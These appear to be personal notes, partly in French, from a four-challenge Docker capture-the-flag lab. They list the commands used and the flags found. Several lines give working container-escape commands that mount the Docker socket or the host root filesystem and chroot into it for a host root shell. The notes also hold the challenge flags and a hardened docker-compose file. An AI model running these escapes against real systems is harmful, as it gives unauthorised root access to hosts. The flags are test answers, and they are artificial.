Commande connecte a un docker : docker exec -it ctf-ch1-privileged /bin/bash

### CH1
Flag 1 : cat flag1_root_escape.txt 
flag{CTF_CHAL1_ROOT_ESCAPE_VIA_PRIVILEGED_CONTAINER}

Flag 2 : root@6e0115319e02:/host/root/ctf_flags# cat flag2_dockersock.txt 
flag{CTF_CHAL2_DOCKER_SOCK_RCE}

find / -name '*flag*' 2>/dev/null

### CH2
analyst@debian:/opt/ctf/ch2$ docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it docker:stable sh

docker run -v /:/mnt/host --rm -it alpine sh -c "chroot /mnt/host /bin/bash"

cat /var/lib/docker/overlay2/kb6uy8tqsiulpe5tpiciwi09o/diff/opt/.hidden/flag3.txt
flag{CTF_CHAL3_MALICIOUS_DOCKER_IMAGE_ANALYSIS}

flag{CTF_CHAL3_MALICIOUS_DOCKER_IMAGE_ANALYSIS}

### CH3
docker inspect ctf-ch3-malicious

docker exec -it ctf-ch3-malicious /bin/bash

find / -name '*flag*' 2>/dev/null
appuser@1edc89a6460d:~$ cat /opt/.hidden/flag3.txt
flag{CTF_CHAL3_MALICIOUS_DOCKER_IMAGE_ANALYSIS}

### CH4
analyst@debian:/opt/ctf/ch4$ docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it docker:stable sh

docker run -v /:/mnt/host --rm -it alpine sh -c "chroot /mnt/host /bin/bash"

modif du docker_compose :
at docker-compose.yml 
version: "3.8"
services:
  web:
    image: nginx:latest
    ports:
      - "8080:80"
    read_only: true
    cap_drop:
      - ALL
    user: "nginx"

 cat flag4_hardening.txt 
CTF_CHAL4_DOCKER_COMPOSE_HARDENING_SUCCESS
